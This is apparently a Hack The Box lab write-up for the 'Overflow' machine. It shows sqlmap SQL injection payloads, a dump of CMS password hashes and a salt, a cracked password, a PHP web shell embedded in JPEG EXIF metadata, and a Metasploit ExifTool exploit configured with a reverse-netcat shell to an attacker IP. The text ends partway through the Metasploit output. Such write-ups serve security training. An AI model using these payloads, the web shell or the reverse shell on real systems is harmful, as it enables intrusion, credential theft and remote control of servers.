+<span class="hljs-meta">---</span>
+<span class="hljs-attr">Parameter:</span> <span class="hljs-string">name</span> <span class="hljs-string">(GET)</span>
+    <span class="hljs-attr">Type:</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span>
+    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-string">AND</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span> <span class="hljs-string">(query</span> <span class="hljs-string">SLEEP)</span>
+    <span class="hljs-attr">Payload:</span> <span class="hljs-string">name=&#x27;)</span> <span class="hljs-string">AND</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">4596 </span><span class="hljs-string">FROM</span> <span class="hljs-string">(SELECT(SLEEP(5)))mZCZ)</span> <span class="hljs-string">AND</span> <span class="hljs-string">(&#x27;YfJn&#x27;=&#x27;YfJn</span>
+
+    <span class="hljs-attr">Type:</span> <span class="hljs-string">UNION</span> <span class="hljs-string">query</span>
+    <span class="hljs-attr">Title:</span> <span class="hljs-string">Generic</span> <span class="hljs-string">UNION</span> <span class="hljs-string">query</span> <span class="hljs-string">(NULL)</span> <span class="hljs-bullet">-</span> <span class="hljs-number">3</span> <span class="hljs-string">columns</span>
+    <span class="hljs-attr">Payload:</span> <span class="hljs-string">name=&#x27;)</span> <span class="hljs-string">UNION</span> <span class="hljs-string">ALL</span> <span class="hljs-string">SELECT</span> <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">CONCAT(0x717a627071</span>,<span class="hljs-number">0x47424b5376754a717a694d50714d78717978544b457664636c746f65504b58536f4a57764468546d</span>,<span class="hljs-number">0x716a707a71</span><span class="hljs-string">)--</span> <span class="hljs-bullet">-</span>
+<span class="hljs-meta">---</span>
+[<span class="hljs-number">16</span><span class="hljs-string">:13:00</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">the</span> <span class="hljs-string">back-end</span> <span class="hljs-string">DBMS</span> <span class="hljs-string">is</span> <span class="hljs-string">MySQL</span>
+<span class="hljs-attr">web server operating system:</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-number">18.04</span> <span class="hljs-string">(bionic)</span>
+<span class="hljs-attr">web application technology:</span> <span class="hljs-string">Apache</span> <span class="hljs-number">2.4</span><span class="hljs-number">.29</span>
+<span class="hljs-attr">back-end DBMS:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span>
+[<span class="hljs-number">16</span><span class="hljs-string">:13:00</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">fetched</span> <span class="hljs-string">data</span> <span class="hljs-string">logged</span> <span class="hljs-string">to</span> <span class="hljs-string">text</span> <span class="hljs-string">files</span> <span class="hljs-string">under</span> <span class="hljs-string">&#x27;/home/kali/.local/share/sqlmap/output/overflow.htb&#x27;</span>
+
+[<span class="hljs-string">*</span>] <span class="hljs-string">ending</span> <span class="hljs-string">@</span> <span class="hljs-number">16</span><span class="hljs-string">:13:00</span> <span class="hljs-string">/2021-11-14/</span>
+</code></pre></div>
+<p>Now we can use this to enumerate and dump information from the database.</p>
+<p><code class="inline-code">sqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA --dbs</code></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">16:13:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL &gt;= 5.0.12
+[16:13:41] [INFO] fetching database names
+available databases [4]:
+[*] cmsmsdb
+[*] information_schema
+[*] logs
+[*] Overflow</pre><pre class="hljs"><code>16:13:41] <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL &gt;= 5.0.12
+<span class="hljs-comment">[16:13:41]</span> <span class="hljs-comment">[INFO]</span> fetching database names
+available databases <span class="hljs-comment">[4]</span>:
+<span class="hljs-comment">[*]</span> cmsmsdb
+<span class="hljs-comment">[*]</span> information_schema
+<span class="hljs-comment">[*]</span> logs
+<span class="hljs-comment">[*]</span> Overflow</code></pre></div>
+<p>The Overflow database was empty.  The logs database didnt have any useful information.  Let's grab the password hash from the cmsmsdb directory</p>
+<p><code class="inline-code">$ sqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb --tables   </code></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">---SNIP--
+| cms_module_search_items_seq |
+| cms_module_search_words     |
+| cms_module_smarty_plugins   |
+| cms_module_templates        |
+| cms_modules                 |
+| cms_permissions             |
+| cms_permissions_seq         |
+| cms_routes                  |
+| cms_siteprefs               |
+| cms_user_groups             |
+| cms_userplugins             |
+| cms_userplugins_seq         |
+| cms_userprefs               |
+| cms_users                   |
+| cms_users_seq               |
+| cms_version                 |
++-----------------------------+</pre><pre class="hljs"><code>---SNIP--
+|<span class="hljs-string"> cms_module_search_items_seq </span>|
+|<span class="hljs-string"> cms_module_search_words     </span>|
+|<span class="hljs-string"> cms_module_smarty_plugins   </span>|
+|<span class="hljs-string"> cms_module_templates        </span>|
+|<span class="hljs-string"> cms_modules                 </span>|
+|<span class="hljs-string"> cms_permissions             </span>|
+|<span class="hljs-string"> cms_permissions_seq         </span>|
+|<span class="hljs-string"> cms_routes                  </span>|
+|<span class="hljs-string"> cms_siteprefs               </span>|
+|<span class="hljs-string"> cms_user_groups             </span>|
+|<span class="hljs-string"> cms_userplugins             </span>|
+|<span class="hljs-string"> cms_userplugins_seq         </span>|
+|<span class="hljs-string"> cms_userprefs               </span>|
+|<span class="hljs-string"> cms_users                   </span>|
+|<span class="hljs-string"> cms_users_seq               </span>|
+|<span class="hljs-string"> cms_version                 </span>|
++-----------------------------+</code></pre></div>
+<p>``$ sqlmap -u <a data-from-md title='http://overflow.htb/home/logs.php?name=' href='http://overflow.htb/home/logs.php?name='>http://overflow.htb/home/logs.php?name=</a> --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_users --dump`</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Database: cmsmsdb
+Table: cms_users
+[2 entries]
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+| user_id | email              | active | password                         | username | last_name | first_name | create_date         | admin_access | modified_date       |
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+| 1       | admin@overflow.htb | 1      | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin    | &lt;blank&gt;   | &lt;blank&gt;    | 2021-05-24 21:18:35 | 1            | 2021-05-26 14:49:15 |
+| 3       | &lt;blank&gt;            | 1      | e3d748d58b58657bfa4dffe2def0b1c7 | editor   | &lt;blank&gt;   | editor     | 2021-05-25 06:38:33 | 1            | 2021-05-26 04:13:58 |
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+</pre><pre class="hljs"><code>Database: cmsmsdb
+Table: cms_users
+[2 entries]
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+|<span class="hljs-string"> user_id </span>|<span class="hljs-string"> email              </span>|<span class="hljs-string"> active </span>|<span class="hljs-string"> password                         </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> last_name </span>|<span class="hljs-string"> first_name </span>|<span class="hljs-string"> create_date         </span>|<span class="hljs-string"> admin_access </span>|<span class="hljs-string"> modified_date       </span>|
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+|<span class="hljs-string"> 1       </span>|<span class="hljs-string"> admin@overflow.htb </span>|<span class="hljs-string"> 1      </span>|<span class="hljs-string"> c6c6b9310e0e6f3eb3ffeb2baff12fdd </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> &lt;blank&gt;   </span>|<span class="hljs-string"> &lt;blank&gt;    </span>|<span class="hljs-string"> 2021-05-24 21:18:35 </span>|<span class="hljs-string"> 1            </span>|<span class="hljs-string"> 2021-05-26 14:49:15 </span>|
+|<span class="hljs-string"> 3       </span>|<span class="hljs-string"> &lt;blank&gt;            </span>|<span class="hljs-string"> 1      </span>|<span class="hljs-string"> e3d748d58b58657bfa4dffe2def0b1c7 </span>|<span class="hljs-string"> editor   </span>|<span class="hljs-string"> &lt;blank&gt;   </span>|<span class="hljs-string"> editor     </span>|<span class="hljs-string"> 2021-05-25 06:38:33 </span>|<span class="hljs-string"> 1            </span>|<span class="hljs-string"> 2021-05-26 04:13:58 </span>|
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+</code></pre></div>
+<p>We now have some hashes.  Given the exploit code we were working with before required a salt, we'll need that as well.  From my research, I identified the salt is the sitemask value in the cms_siteprefs table.</p>
+<p>$ sqlmap -u <a data-from-md title='http://overflow.htb/home/logs.php?name=' href='http://overflow.htb/home/logs.php?name='>http://overflow.htb/home/logs.php?name=</a> --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_siteprefs --dump</p>
+<p><code class="inline-code">| sitemask                                    | 6c2d17f37e226486</code></p>
+<p>Rather than try to figure out the format for the salt and password, I decided to repurpose the previous exploit script's cracking capability by hardcoding the salt and hash values and commenting out all the functions but the cracking functions.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
+session = requests.Session()
+dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
+flag = True
+password = &quot;c6c6b9310e0e6f3eb3ffeb2baff12fdd&quot;
+temp_password = &quot;&quot;
+TIME = 1
+db_name = &quot;&quot;
+output = &quot;&quot;
+email = &quot;&quot;
+
+salt = '6c2d17f37e226486'</pre><pre class="hljs"><code><span class="hljs-attr">url_vuln</span> = options.url + <span class="hljs-string">&#x27;/moduleinterface.php?mact=News,m1_,default,0&#x27;</span>
+<span class="hljs-attr">session</span> = requests.Session()
+<span class="hljs-attr">dictionary</span> = <span class="hljs-string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&#x27;</span>
+<span class="hljs-attr">flag</span> = <span class="hljs-literal">True</span>
+<span class="hljs-attr">password</span> = <span class="hljs-string">&quot;c6c6b9310e0e6f3eb3ffeb2baff12fdd&quot;</span>
+<span class="hljs-attr">temp_password</span> = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-attr">TIME</span> = <span class="hljs-number">1</span>
+<span class="hljs-attr">db_name</span> = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-attr">output</span> = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-attr">email</span> = <span class="hljs-string">&quot;&quot;</span>
+
+<span class="hljs-attr">salt</span> = <span class="hljs-string">&#x27;6c2d17f37e226486&#x27;</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">#dump_salt()
+#dump_username()
+#dump_email()
+#dump_password()
+print password
+print salt</pre><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">dump_salt</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">dump_username</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">dump_email</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">dump_password</span><span class="hljs-params">()</span></span>
+print password
+print salt</code></pre></div>
+<p>admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd<br>
+editor:e3d748d58b58657bfa4dffe2def0b1c7</p>
+<p>The admin password failed to crack, but the editor password was found.</p>
+<p>alpha!@#$%bravo</p>
+<p>Trying editor:alpha!@#$%bravo at the CMS login screen gives us access!!</p>
+<p><img src="_resources/2526ceb279594673beacc717c5cb2384.png" alt="07179f1aa89d230775b93459fed81824.png"></p>
+<p>Now that we have valid credentials, we can revisit the exploit database and see if any of the authenticated RCE exploits will work for us.</p>
+<p>This one looks super promising<br>
+<a data-from-md title='https://www.exploit-db.com/exploits/49345' href='https://www.exploit-db.com/exploits/49345'>https://www.exploit-db.com/exploits/49345</a></p>
+<p><img src="_resources/995adfbab9c44b5f8e2dd2f5bdb7000e.png" alt="3134df610f09423da7bb6937353809c2.png"><br>
+However, it failed to provide a return shell.</p>
+<p>But this existing defined tag looks like something we need to dig into.<br>
+<img src="_resources/e19f71487504482f9cb9cb328e53fa7b.png" alt="5a9feeabf23a69b047c49b3bec2924d7.png"></p>
+<p>We'll need to add the new hostname to our hosts file.  Once that's done, we can browse to it.</p>
+<p><img src="_resources/8f9a3fbbe92548f9b5129fdccc6a21fe.png" alt="775ba6c51b26ddb0002897169d950b9a.png"></p>
+<p>We're able to log in using the editor credentials from CMS.</p>
+<p><img src="_resources/85de84a6eb1f431eaabcd5918748b486.png" alt="743f552eaa4f76b8e7eedd9c38d2253c.png"></p>
+<p>Poking around on the website, we find an upload function when we click on our account.  I tried uploading a php webshell, but it failed due to unsupported filetype.</p>
+<p>I noticed the response through burp showed an <code class="inline-code">exiftool</code> output.  There's a well known exploit using this tool that will allow for php remote code execution.</p>
+<p><img src="_resources/a12be383e57b4f2a923312b1ef123daf.png" alt="c6a86439dd5a95304cabdb4227bbf91a.png"></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">HTTP/1.1 302 Moved Temporarily
+Date: Sun, 14 Nov 2021 22:32:43 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Location: ./index.php?upload=0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1118
+
+ExifTool Version Number         : 11.92
+File Name                       : 61918e8b6c44f7.17828563.jpg
+Directory                       : ../../assets/data/upliid
+File Size                       : 10 kB
+File Modification Date/Time     : 2021:11:15 04:02:43+05:30
+File Access Date/Time           : 2021:11:15 04:02:43+05:30
+File Inode Change Date/Time     : 2021:11:15 04:02:43+05:30
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : &lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[cmd]); ?&gt;
+Image Width                     : 275
+Image Height                    : 183
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 275x183
+Megapixels                      : 0.050</pre><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">302</span> Moved Temporarily
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 14 Nov 2021 22:32:43 GMT
+<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.4.29 (Ubuntu)
+<span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>./index.php?upload=0
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1118
+
+<span class="language-apache"><span class="hljs-attribute">ExifTool</span> Version Number         : <span class="hljs-number">11</span>.<span class="hljs-number">92</span>
+<span class="hljs-attribute">File</span> Name                       : <span class="hljs-number">61918</span>e8b6c44f7.<span class="hljs-number">17828563</span>.jpg
+<span class="hljs-attribute">Directory</span>                       : ../../assets/data/upliid
+<span class="hljs-attribute">File</span> Size                       : <span class="hljs-number">10</span> kB
+<span class="hljs-attribute">File</span> Modification Date/Time     : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Access Date/Time           : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Inode Change Date/Time     : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">02</span>:<span class="hljs-number">43</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Permissions                : rw-r--r--
+<span class="hljs-attribute">File</span> Type                       : JPEG
+<span class="hljs-attribute">File</span> Type Extension             : jpg
+<span class="hljs-attribute">MIME</span> Type                       : image/jpeg
+<span class="hljs-attribute">JFIF</span> Version                    : <span class="hljs-number">1</span>.<span class="hljs-number">01</span>
+<span class="hljs-attribute">Resolution</span> Unit                 : None
+<span class="hljs-attribute">X</span> Resolution                    : <span class="hljs-number">1</span>
+<span class="hljs-attribute">Y</span> Resolution                    : <span class="hljs-number">1</span>
+<span class="hljs-attribute">Comment</span>                         : &lt;?php echo <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>; system($_GET[cmd]); ?&gt;
+<span class="hljs-attribute">Image</span> Width                     : <span class="hljs-number">275</span>
+<span class="hljs-attribute">Image</span> Height                    : <span class="hljs-number">183</span>
+<span class="hljs-attribute">Encoding</span> Process                : Baseline DCT, Huffman coding
+<span class="hljs-attribute">Bits</span> Per Sample                 : <span class="hljs-number">8</span>
+<span class="hljs-attribute">Color</span> Components                : <span class="hljs-number">3</span>
+<span class="hljs-attribute">Y</span> Cb Cr Sub Sampling            : YCbCr4:<span class="hljs-number">2</span>:<span class="hljs-number">0</span> (<span class="hljs-number">2</span> <span class="hljs-number">2</span>)
+<span class="hljs-attribute">Image</span> Size                      : <span class="hljs-number">275</span>x183
+<span class="hljs-attribute">Megapixels</span>                      : <span class="hljs-number">0</span>.<span class="hljs-number">050</span></span></code></pre></div>
+<p>I weaponized a jpg file and tried uploading it to the server.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ exiftool -DocumentName=&quot;&lt;h1&gt;test&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;&quot; pirate.php.jpg</pre><pre class="hljs"><code><span class="language-xml">$ exiftool -DocumentName=&quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>test<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(\<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])){<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;\<span class="hljs-variable">$cmd</span> = (\<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);system(\<span class="hljs-variable">$cmd</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;} <span class="hljs-comment"><span class="hljs-keyword">__halt_compiler</span>();?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot; pirate.php.jpg</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">HTTP/1.1 302 Moved Temporarily
+
+Date: Mon, 15 Nov 2021 13:33:52 GMT
+
+Server: Apache/2.4.29 (Ubuntu)
+
+Location: ./index.php?upload=0
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+Content-Length: 1324
+
+
+
+ExifTool Version Number         : 11.92
+File Name                       : 619261c0061979.05383080.jpg
+Directory                       : ../../assets/data/upliid
+File Size                       : 10 kB
+File Modification Date/Time     : 2021:11:15 19:03:52+05:30
+File Access Date/Time           : 2021:11:15 19:03:52+05:30
+File Inode Change Date/Time     : 2021:11:15 19:03:52+05:30
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Document Name                   : &lt;h1&gt;F1uffyGoat&lt;br&gt;&lt;?php if(isset($_REQUEST['cmd'])){echo '&lt;pre&gt;';$cmd = ($_REQUEST['cmd']);system($cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;
+X Resolution                    : 1
+Y Resolution                    : 1
+Resolution Unit                 : None
+Y Cb Cr Positioning             : Centered
+Image Width                     : 275
+Image Height                    : 183
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 275x183
+Megapixels                      : 0.050</pre><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">302</span> Moved Temporarily
+
+<span class="language-apache"><span class="hljs-attribute">Date</span>: Mon, <span class="hljs-number">15</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">13</span>:<span class="hljs-number">33</span>:<span class="hljs-number">52</span> GMT
+
+<span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">29</span> (Ubuntu)
+
+<span class="hljs-attribute">Location</span>: ./index.php?upload=<span class="hljs-number">0</span>
+
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="hljs-attribute">Content</span>-Type: text/html; charset=UTF-<span class="hljs-number">8</span>
+
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">1324</span>
+
+
+
+<span class="hljs-attribute">ExifTool</span> Version Number         : <span class="hljs-number">11</span>.<span class="hljs-number">92</span>
+<span class="hljs-attribute">File</span> Name                       : <span class="hljs-number">619261</span>c0061979.<span class="hljs-number">05383080</span>.jpg
+<span class="hljs-attribute">Directory</span>                       : ../../assets/data/upliid
+<span class="hljs-attribute">File</span> Size                       : <span class="hljs-number">10</span> kB
+<span class="hljs-attribute">File</span> Modification Date/Time     : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">52</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Access Date/Time           : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">52</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Inode Change Date/Time     : <span class="hljs-number">2021</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span> <span class="hljs-number">19</span>:<span class="hljs-number">03</span>:<span class="hljs-number">52</span>+<span class="hljs-number">05</span>:<span class="hljs-number">30</span>
+<span class="hljs-attribute">File</span> Permissions                : rw-r--r--
+<span class="hljs-attribute">File</span> Type                       : JPEG
+<span class="hljs-attribute">File</span> Type Extension             : jpg
+<span class="hljs-attribute">MIME</span> Type                       : image/jpeg
+<span class="hljs-attribute">JFIF</span> Version                    : <span class="hljs-number">1</span>.<span class="hljs-number">01</span>
+<span class="hljs-attribute">Exif</span> Byte Order                 : Big-endian (Motorola, MM)
+<span class="hljs-attribute">Document</span> Name                   : &lt;h1&gt;F1uffyGoat&lt;br&gt;&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;])){echo &#x27;&lt;pre&gt;&#x27;;$cmd = ($_REQUEST[&#x27;cmd&#x27;]);system($cmd);echo &#x27;&lt;/pre&gt;&#x27;;} __halt_compiler();?&gt;&lt;/h1&gt;
+<span class="hljs-attribute">X</span> Resolution                    : <span class="hljs-number">1</span>
+<span class="hljs-attribute">Y</span> Resolution                    : <span class="hljs-number">1</span>
+<span class="hljs-attribute">Resolution</span> Unit                 : None
+<span class="hljs-attribute">Y</span> Cb Cr Positioning             : Centered
+<span class="hljs-attribute">Image</span> Width                     : <span class="hljs-number">275</span>
+<span class="hljs-attribute">Image</span> Height                    : <span class="hljs-number">183</span>
+<span class="hljs-attribute">Encoding</span> Process                : Baseline DCT, Huffman coding
+<span class="hljs-attribute">Bits</span> Per Sample                 : <span class="hljs-number">8</span>
+<span class="hljs-attribute">Color</span> Components                : <span class="hljs-number">3</span>
+<span class="hljs-attribute">Y</span> Cb Cr Sub Sampling            : YCbCr4:<span class="hljs-number">2</span>:<span class="hljs-number">0</span> (<span class="hljs-number">2</span> <span class="hljs-number">2</span>)
+<span class="hljs-attribute">Image</span> Size                      : <span class="hljs-number">275</span>x183
+<span class="hljs-attribute">Megapixels</span>                      : <span class="hljs-number">0</span>.<span class="hljs-number">050</span></span></code></pre></div>
+<p>Because the server renames our file dropping the php extension, the payload fails to execute.</p>
+<p>Doing a little more research on exiftool - specially version 11.92, I stumbled onto a fairly new vulnerability <a data-from-md title='https://www.exploit-db.com/download/49881' href='https://www.exploit-db.com/download/49881'>CVE-2021-22204</a>.</p>
+<p>Metasploit has a module for the exploit, which makes this super convenient.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ msfconsole -q                                                                                                                 [21-11-15 10:38:36]
+msf6 &gt; search exiftool
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
+
+msf6 &gt; use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; show options
+
+Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.jpg          yes       Output file
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.221.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   JPEG file
+
+
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; set LHOST 10.10.14.124
+LHOST =&gt; 10.10.14.124
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; set LPORT 80
+LPORT =&gt; 80
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; run
+
+[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
+</pre><pre class="hljs"><code>$ msfconsole -q                                                                                                                 [<span class="hljs-number">21</span>-<span class="hljs-number">11</span>-<span class="hljs-number">15</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">36</span>]
+msf6 &gt; search exiftool
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank       Check  <span class="hljs-keyword">Description</span>
+   -  ----                                                      ---------------  ----       -----  -----------
+   <span class="hljs-number">0</span>  exploit<span class="hljs-regexp">/unix/</span>fileformat/exiftool_djvu_ant_perl_injection  <span class="hljs-number">2021</span>-<span class="hljs-number">05</span>-<span class="hljs-number">24</span>       excellent  No     ExifTool DjVu <span class="hljs-keyword">ANT</span> Perl injection
+
+
+Interact with a module by name or index. <span class="hljs-keyword">For</span> example info <span class="hljs-number">0</span>, use <span class="hljs-number">0</span> or use exploit<span class="hljs-regexp">/unix/</span>fileformat/exiftool_djvu_ant_perl_injection
+
+msf6 &gt; use <span class="hljs-number">0</span>
+[*] No payload configured, defaulting to cmd<span class="hljs-regexp">/unix/</span>reverse_netcat
+msf6 exploit(unix<span class="hljs-regexp">/fileformat/</span>exiftool_djvu_ant_perl_injection) &gt; show <span class="hljs-keyword">options</span>
+
+Module <span class="hljs-keyword">options</span> (exploit<span class="hljs-regexp">/unix/</span>fileformat/exiftool_djvu_ant_perl_injection):
+
+   Name      Current Setting  Required  <span class="hljs-keyword">Description</span>
+   ----      ---------------  --------  -----------
+   FILENAME  msf.jpg          yes       Output <span class="hljs-keyword">file</span>
+
+
+Payload <span class="hljs-keyword">options</span> (cmd<span class="hljs-regexp">/unix/</span>reverse_netcat):
+
+   Name   Current Setting  Required  <span class="hljs-keyword">Description</span>
